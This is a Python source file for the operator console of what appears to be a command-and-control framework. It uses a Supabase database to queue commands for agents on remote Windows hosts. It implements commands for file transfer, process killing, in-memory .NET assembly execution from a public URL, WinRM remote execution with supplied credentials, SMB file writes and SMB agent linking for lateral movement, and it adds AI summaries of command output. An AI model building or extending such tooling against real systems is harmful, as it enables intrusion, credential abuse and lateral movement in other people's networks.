import time
import itertools
import os
import threading

from .database import supabase, get_public_url
from .download import download_file
from .upload import upload_file
from .ai_summary import generate_summary  # Import the new AI summary module

# Spinner for visual feedback
spinner = itertools.cycle(['|', '/', '-', '\\'])

# ANSI escape codes for colors
GREEN = '\033[32m'
RED = '\033[31m'
BLUE = '\033[34m'
PURPLE = '\033[35m'
LIGHT_GREY = '\033[38;5;250m'
YELLOW = '\033[33m'
RESET = '\033[0m'

# Add a global setting to toggle AI summary
AI_SUMMARY = True

def view_command_history(hostname):
    """Fetch and display the command history for a specific host and its SMB agents."""
    response = supabase.table('py2').select('created_at', 'hostname', 'username', 'ip', 'command', 'output', 'smbhost', 'ai_summary').or_(
        f"hostname.eq.{hostname},smbhost.eq.{hostname}"
    ).order('created_at', desc=False).execute()

    commands = response.data

    if not commands:
        print(f"\n{YELLOW}No command history available for {hostname}.{RESET}")
        return

    print(f"\n{GREEN}Command History for {hostname}:{RESET}")

    for command in commands:
        created_at = command['created_at']
        username = command['username']
        ip = command.get('ip', 'N/A')
        cmd = command['command']
        output = command['output']
        ai_summary = command.get('ai_summary', 'No summary available')

        # Use smbhost if it exists, otherwise use hostname
        if command.get('smbhost'):
            exec_hostname = command['smbhost']
            color = RED  # Set color to red for SMB host
        else:
            exec_hostname = command['hostname']
            color = RESET

        print(f"\n{color}Time:{RESET} {created_at}")
        print(f"{color}User:{RESET} {username}")
        print(f"{color}IP:{RESET} {ip}")
        print(f"{color}Hostname:{RESET} {exec_hostname}")
        print(f"{color}Command:{RESET} {cmd}")
        print(f"{color}Output:{RESET} {output}")
        print(f"{color}AI Summary:{RESET} {ai_summary}")
        print(f"{PURPLE}{'-' * 50}{RESET}")

def file_exists_in_supabase(bucket_name, storage_path):
    folder_path = os.path.dirname(storage_path)
    response = supabase.storage.from_(bucket_name).list(folder_path)
    if isinstance(response, list):
        for file in response:
            if file['name'] == os.path.basename(storage_path):
                return True
    return False

def check_for_completed_commands(command_id, hostname, printed_flag, smbhost):
    response = supabase.table('py2').select('status', 'command', 'output').eq('id', command_id).execute()
    command_info = response.data[0]
    if command_info['status'] in ('Completed', 'Failed'):
        if not printed_flag.is_set():
            output = command_info.get('output', 'No output available')
            cmd = command_info.get('command', 'No command available')
            display_hostname = smbhost if smbhost else hostname
            if command_info['status'] == 'Failed':
                print(f"\n\n{RED}Error:{RESET} Command failed on {GREEN}{display_hostname}{RESET}\n\n {output}")
            else:
                print(f"\n\nOutput from {GREEN}{display_hostname}{RESET}\n\n {output}\n")

            # Generate AI summary if enabled
            if AI_SUMMARY:
                ai_summary = generate_summary(cmd, output)
                if ai_summary:
                    print(f"\n{BLUE}AI Summary:{RESET} {ai_summary}\n")
                    supabase.table('py2').update({'ai_summary': ai_summary}).eq('id', command_id).execute()

            printed_flag.set()
        return True
    return False

def background_check(command_id, hostname, completed_event, printed_flag, smbhost):
    while not completed_event.is_set():
        time.sleep(10)
        if check_for_completed_commands(command_id, hostname, printed_flag, smbhost):
            completed_event.set()
            break

def send_command_and_get_output(hostname, username, command_mappings, current_sleep_interval):
    linked_smb_ip = None
    smb_hostname = None

    def get_prompt():
        if smb_hostname:
            return f"{LIGHT_GREY}{username}{RESET} ({GREEN}{hostname}{RESET}::{BLUE}{smb_hostname}{RESET} {RED}smb{RESET}) ~ "
        else:
            return f"{LIGHT_GREY}{username}{RESET} ({GREEN}{hostname}{RESET}::{BLUE}{external_ip}{RESET}) ~ "

    print(f"\nYou are now interacting with '{GREEN}{hostname}{RESET}'. Type 'exit' or 'help' for options.")
    print(f"Commands are being issued by user: {username}")

    external_ip = supabase.table("settings").select("external_ip").eq("hostname", hostname).execute().data
    external_ip = external_ip[0].get('external_ip', 'unknown') if external_ip else 'unknown'

    while True:
        prompt = get_prompt()
        command_text = input(prompt).strip().lower()

        if not command_text:
            print(f"{RED}Error:{RESET} Invalid command, please enter a command.")
            continue

        if command_text == 'help':
            print("\nAvailable Shortcut Commands:")
            for shortcut, command in command_mappings.items():
                print(f" {shortcut:<10}        :: {command}")
            print(" sleep <number>          :: Set a custom timeout (ex. sleep 5)")
            print(" download <file_path>       :: Download a file from the asset")
            print(" upload <local_path> <remote_path> :: Upload a file to the asset")
            print(" ps                :: List all processes")
            print(" ps grep <pattern>         :: Filter processes by name (Windows API)")
            print(" ps term <processid>        :: Terminate a process by its process ID")
            print(" run <path_to_remote_file>     :: Launch a process via Windows API")
            print(" ls <directory_path>        :: List contents of a directory")
            print(" whoami              :: Display user information (on Windows /all)")
            print(" pwd                :: Display current working directory")
            print(" users <group_name>        :: List users in the specified group on Windows host via Windows API")
            print(" netexec <local_file> <arguments> :: Run a .NET assembly in-memory")
            print(" smb write <local_file_path> <remote_smb_path> [username password domain] :: Write a file to a remote host via SMB protocol")
            print(" smb get <remote_file_path> <local_file_path> [username password domain] :: Get a file from a remote host via SMB protocol")
            print(" winrmexec <remote_host> <command> [username password domain] :: Execute a command on a remote host via WinRM")
            print(" link smb agent <ip_address> [username password domain] :: Link the SMB agent to the current host using the specified IP address, optionally with credentials")
            print(" unlink smb agent <ip_address>   :: Unlink the SMB agent from the current host using the specified IP address")
            print(" kill               :: Terminate the agent")
            print(" hostname             :: Retrieve the local hostname using the Windows API")
            print(" nslookup <hostname>        :: Perform a DNS lookup for the given hostname using the Windows API")
            print(" exit               :: Return to main menu\n")
            continue

        if command_text == 'exit':
            print("Returning to the main menu.")
            break

        if command_text == 'kill':
            print(f"Sending kill command to terminate {GREEN}{hostname}{RESET} agent.")
            command_text = "kill"

        if command_text.startswith("download"):
            try:
                parts = command_text.split(maxsplit=1)
                if len(parts) < 2:
                    print(f"{RED}Error:{RESET} Invalid download command format. Use 'download <file_path>'.")
                    continue
                _, file_path = parts
                if linked_smb_ip:
                    command_text = f"smb download {file_path}"
                else:
                    download_file(hostname, file_path, username)
                continue
            except ValueError:
                print(f"{RED}Error:{RESET} Invalid download command format. Use 'download <file_path>'.")
                continue

        if command_text.startswith("cmd"):
            print(f"{RED}Error:{RESET} cmd is passed by default, enter the command you'd want to run after cmd.")
            continue

        if command_text == 'ps':
            command_text = "ps"

        elif command_text.startswith('ps grep'):
            parts = command_text.split(maxsplit=2)
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid ps grep command format. Use 'ps grep <pattern>'.")
                continue
            _, _, pattern = parts
            command_text = f"ps grep {pattern}"

        elif command_text.startswith('ps term'):
            parts = command_text.split(maxsplit=2)
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid ps term command format. Use 'ps term <processid>'.")
                continue
            _, _, process_id = parts
            if not process_id.isdigit():
                print(f"{RED}Error:{RESET} Invalid ps term command format. Process ID must be a number.")
                continue
            command_text = f"ps term {process_id}"

        elif command_text.startswith("ls"):
            parts = command_text.split(maxsplit=1)
            if len(parts) == 1:
                command_text = "ls ."
            else:
                command_text = f"ls {parts[1]}"

        elif command_text == "whoami":
            command_text = "whoami"

        elif command_text.startswith("run"):
            parts = command_text.split(maxsplit=1)
            if len(parts) == 1:
                print(f"{RED}Error:{RESET} Invalid run command format. Use 'run <path_to_remote_file>'.")
                continue
            else:
                command_text = f"run {parts[1]}"

        elif command_text.startswith("users"):
            parts = command_text.split(maxsplit=1)
            if len(parts) == 1:
                print(f"{RED}Error:{RESET} Invalid users command format. Use 'users <group_name>'.")
                continue
            else:
                command_text = f"users {parts[1]}"

        elif command_text.startswith("smb write"):
            parts = command_text.split()
            if len(parts) < 4:
                print(f"{RED}Error:{RESET} Invalid smb write command format. Use 'smb write <local_file_path> <remote_smb_path> [username password domain]'.")
                continue
            local_file_path = parts[2]
            remote_smb_path = parts[3]
            if len(parts) == 7:
                username, password, domain = parts[4], parts[5], parts[6]
                command_text = f"smb write {local_file_path} {remote_smb_path} {username} {password} {domain}"
            else:
                command_text = f"smb write {local_file_path} {remote_smb_path}"

        elif command_text.startswith("smb get"):
            parts = command_text.split()
            if len(parts) < 4:
                print(f"{RED}Error:{RESET} Invalid smb get command format. Use 'smb get <remote_file_path> <local_file_path> [username password domain]'.")
                continue
            remote_file_path = parts[2]
            local_file_path = parts[3]
            if len(parts) == 7:
                username, password, domain = parts[4], parts[5], parts[6]
                command_text = f"smb get {remote_file_path} {local_file_path} {username} {password} {domain}"
            else:
                command_text = f"smb get {remote_file_path} {local_file_path}"

        elif command_text.startswith("winrmexec "):
            parts = command_text.split()
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid winrmexec command format. Use 'winrmexec <remote_host> <command> [username password domain]'.")
                continue
            remote_host = parts[1]
            command = parts[2]
            if len(parts) == 6:
                username, password, domain = parts[3], parts[4], parts[5]
                command_text = f"winrmexec {remote_host} {command} {username} {password} {domain}"
            else:
                command_text = f"winrmexec {remote_host} {command}"

        elif command_text.startswith("netexec"):
            parts = command_text.split(maxsplit=2)
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid netexec command format. Use 'netexec <local_file> <arguments>'. Refer to the help section by typing 'help'.")
                continue

            _, local_file, arguments = parts

            bucket_name = "files"
            filename = os.path.basename(local_file)
            storage_path = f"netexec/{filename}"

            try:
                if not file_exists_in_supabase(bucket_name, storage_path):
                    with open(local_file, 'rb') as f:
                        response = supabase.storage.from_(bucket_name).upload(storage_path, f)
                    print(f"File uploaded and available at: {get_public_url(bucket_name, storage_path)}")
                else:
                    print(f"File already exists at: {get_public_url(bucket_name, storage_path)}")

                file_url = get_public_url(bucket_name, storage_path)
                command_text = f"netexec {file_url} {arguments}"
            except Exception as e:
                print(f"{RED}Error:{RESET} {e}")
                continue

        elif command_text.startswith("link smb agent"):
            parts = command_text.split(maxsplit=6)
            if len(parts) < 4 or len(parts) > 7:
                print(f"{RED}Error:{RESET} Invalid link smb agent command format. Use 'link smb agent <ip_address> [username password domain]'.")
                continue
            linked_smb_ip = parts[3]
            if len(parts) == 4:
                command_text = f"link smb agent {linked_smb_ip}"
            elif len(parts) == 5:
                username = parts[4]
                command_text = f"link smb agent {linked_smb_ip} {username}"
            elif len(parts) == 6:
                username, password = parts[4], parts[5]
                command_text = f"link smb agent {linked_smb_ip} {username} {password}"
            elif len(parts) == 7:
                username, password, domain = parts[4], parts[5], parts[6]
                command_text = f"link smb agent {linked_smb_ip} {username} {password} {domain}"

        elif command_text.startswith("unlink smb agent"):
            parts = command_text.split(maxsplit=3)
            if len(parts) != 4:
                print(f"{RED}Error:{RESET} Invalid unlink smb agent command format. Use 'unlink smb agent <ip_address>'.")
                continue
            if linked_smb_ip == parts[3]:
                linked_smb_ip = None
                smb_hostname = None
            command_text = f"unlink smb agent {parts[3]}"

        elif command_text == "hostname":
            command_text = "hostname"

        elif command_text.startswith("nslookup"):
            parts = command_text.split(maxsplit=1)
            if len(parts) < 2:
                print(f"{RED}Error:{RESET} Invalid nslookup command format. Use 'nslookup <hostname>'.")
                continue
            _, host_to_lookup = parts
            command_text = f"nslookup {host_to_lookup}"

        if linked_smb_ip and not command_text.startswith("link smb agent") and not command_text.startswith("unlink smb agent"):
            command_text = f"smb {command_text}"

        command_text = command_mappings.get(command_text, command_text)

        if command_text.startswith("winrmexec"):
            parts = command_text.split()
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid winrmexec command format. Use 'winrmexec <remote_host> <command> [username password domain]'.")
                continue

        if command_text == "pwd":
            command_text = "pwd"

        if command_text.startswith('sleep'):
            try:
                _, interval = command_text.split()
                current_sleep_interval = int(interval)
                print(f"Sleep interval set to {current_sleep_interval} seconds.")

                supabase.table("settings").update({
                    "timeout_interval": current_sleep_interval
                }).eq("hostname", hostname).execute()

                continue
            except (ValueError, IndexError):
                print(f"{RED}Error:{RESET} Invalid sleep command format. Use 'sleep <number>'.")
                continue

        elif command_text.startswith("upload"):
            try:
                _, local_path, remote_path = command_text.split(maxsplit=2)
                if linked_smb_ip:
                    command_text = f"smb upload {local_path} {remote_path}"
                else:
                    upload_file(hostname, local_path, remote_path, username)
                continue
            except ValueError:
                print(f"{RED}Error:{RESET} Invalid upload command format. Use 'upload <local_path> <remote_path>'.")
                continue

        result = supabase.table('py2').insert({
            'hostname': hostname,
            'username': username,
            'command': command_text,
            'status': 'Pending'
        }).execute()

        if command_text == 'kill':
            print(f"Kill command sent to {hostname}. Shutting down.")
            continue

        command_id = result.data[0]['id']
        print(f"Command '{command_text}' added with ID {command_id}.")
        print("Waiting for the command to complete...", end="", flush=True)

        completed_event = threading.Event()
        printed_flag = threading.Event()
        threading.Thread(target=background_check, args=(command_id, hostname, completed_event, printed_flag, smb_hostname), daemon=True).start()

        first_pass = True
        start_time = time.time()
        timeout_occurred = False
        while True:
            if completed_event.is_set():
                break

            if time.time() - start_time > 60:
                print(f"\n{RED}Error:{RESET} Command timeout. No response from {hostname} for 1 minute.")
                timeout_occurred = True
                break

            if not first_pass:
                for _ in range(10):
                    print(next(spinner), end="\b", flush=True)
                    time.sleep(0.1)
            first_pass = False

            response = supabase.table('py2').select('status', 'command', 'output', 'smbhost').eq('id', command_id).execute()
            command_info = response.data[0]

            if command_info['status'] in ('Completed', 'Failed'):
                completed_event.set()
                if not printed_flag.is_set():
                    smb_hostname = command_info.get('smbhost', smb_hostname)
                    output = command_info.get('output', 'No output available')
                    cmd = command_info.get('command', 'No command available')
                    display_hostname = smb_hostname if smb_hostname else hostname
                    if command_info['status'] == 'Failed':
                        print(f"\n\n{RED}Error:{RESET} Command failed on {GREEN}{display_hostname}{RESET}\n\n {output}")
                    else:
                        print(f"\n\nOutput from {GREEN}{display_hostname}{RESET}\n\n {output}\n")

                    # Generate AI summary if enabled
                    if AI_SUMMARY:
                        ai_summary = generate_summary(cmd, output)
                        if ai_summary:
                            print(f"\n{BLUE}AI Summary:{RESET} {ai_summary}\n")
                            supabase.table('py2').update({'ai_summary': ai_summary}).eq('id', command_id).execute()

                    printed_flag.set()
                break

        if timeout_occurred:
            print(f"Returning to command prompt. You can check for command completion later.")